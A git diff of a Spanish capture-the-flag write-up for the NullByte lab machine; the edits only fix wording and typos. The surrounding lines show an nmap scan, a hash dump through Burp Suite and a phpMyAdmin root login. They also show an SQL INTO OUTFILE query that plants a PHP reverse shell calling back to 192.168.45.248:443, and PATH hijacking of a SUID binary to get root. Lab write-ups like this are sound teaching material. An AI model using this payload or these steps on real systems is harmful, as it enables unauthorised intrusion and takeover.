@@ -68,12 +68,12 @@ nmap -p- --open -n --min-rate 5000 -sVC -Pn -vvv ipVcictima -oN targeted
         <img src="./imagenes/NullByte/burpsuite5.png" alt="Description of your second image">
         <p>&#10095; La decodeamos y nos queda un hash MD5.</p>
         <img src="./imagenes/NullByte/base64.png" alt="Description of your second image">
-        <p>&#10095; La decodeamos y obtenemos una credencial.</p>
+        <p>&#10095; Lo decodeamos y obtenemos una credencial.</p>
         <img src="./imagenes/NullByte/md5.png" alt="Description of your second image">
-        <p>&#10095; Si comprobamos la credencial con hydra vemos que podemos conecctarnos al puerto <code>777 ssh</code> pero 
-        en este writeup vamos a acceder al sistema de otra forma alternativa.</p>
+        <p>&#10095; Si comprobamos la credencial con hydra vemos que podemos conectarnos al puerto <code>777 ssh</code> pero 
+        en este writeup vamos a acceder al sistema de una forma alternativa.</p>
         <img src="./imagenes/NullByte/hydraRamses.png" alt="Description of your second image">
-        <p>&#10095; Si volvemos a <code>burpsuite</code>y volcomas las credenciales mysql.user vemos que encontramos el hash de <code>root</code>.</p>
+        <p>&#10095; Si volvemos a <code>burpsuite</code> y volcomas las credenciales mysql.user vemos que encontramos el hash de <code>root</code>.</p>
         <img src="./imagenes/NullByte/burpsuite6.png" alt="Description of your second image">
         <p>&#10095; Comprobamos que tipo de hash es con la herramienta <code>hash-id</code>, vemos que es <code>SHA-1</code>.</p>
         <img src="./imagenes/NullByte/hashID.png" alt="Description of your second image">
@@ -84,14 +84,14 @@ nmap -p- --open -n --min-rate 5000 -sVC -Pn -vvv ipVcictima -oN targeted
         <p>&#10095; Nos vamos al directorio <code>phpmyadmin</code> y nos conectamos con el usuario <code>root</code> y la password.</p>
         <img src="./imagenes/NullByte/phpmyadminLogin.png" alt="Description of your second image">
         <img src="./imagenes/NullByte/phpmyadmin.png" alt="Description of your second image">
-        <p>&#10095; Escribimos esta query en el campo SQL para que nos cree un archivo <code>shell.php</code> con una revershell 
+        <p>&#10095; Escribimos la siguiente query en el campo SQL para que nos cree un archivo <code>shell.php</code> con una revershell 
         en el directorio <code>uploads</code> y recibimos una shell como <code>www-data</code>.</p>
         <pre><code>
 SELECT "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/192.168.45.248/443 0>&1\"');" into outfile "/var/www/html/uploads/shell.php"
         </code></pre>
         <img src="./imagenes/NullByte/query.png" alt="Description of your second image">
         <p>&#10095; Nos ponemos en escucha con <code>netcat</code> y al entrar a nuestro archivo <code>shell.php</code> recibimos
-        una revershell por nuestro puerto en escucha.</p>
+        una revershell por nuestro puerto en escucha como el usuario <code>www-data</code>.</p>
         <img src="./imagenes/NullByte/shellPHP.png" alt="Description of your second image">
         <img src="./imagenes/NullByte/netcat.png" alt="Description of your second image">
         <h1>Escalada de Privilegios</h1>
@@ -104,9 +104,9 @@ SELECT "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/192.168.45.248/443 0>&1\"
         <img src="./imagenes/NullByte/cat.png" alt="Description of your second image">
         <p>&#10095; Ahora modificamos el <code>PATH</code> para que empiece a buscar por el directorio <code>/tmp/</code>,
         de esta forma cuando ejecutemos el binario <code>procwatch</code> y esto ejecute el comando <code>ps y sh</code>
-        se ejecutaran primero nuestros comandos maliciosos y le cambiremos los privilegios a la bash</p>
+        se ejecutaran primero nuestros comandos maliciosos y le cambiremos los privilegios a la bash.</p>
         <img src="./imagenes/NullByte/path.png" alt="Description of your second image">
-        <p>&#10095; Una vez ejecutado el binario <code>procwatch</code> si listamos los permisos de la bash vemos que es <code>SUID</code>.
+        <p>&#10095; Una vez ejecutado el binario <code>procwatch</code> si listamos los permisos de la bash vemos que ahora es <code>SUID</code>.
         Nos lanzamos una bash como <code>root</code>.</p>
         <img src="./imagenes/NullByte/root.png" alt="Description of your second image">
         <br> <!-- Salto de línea -->
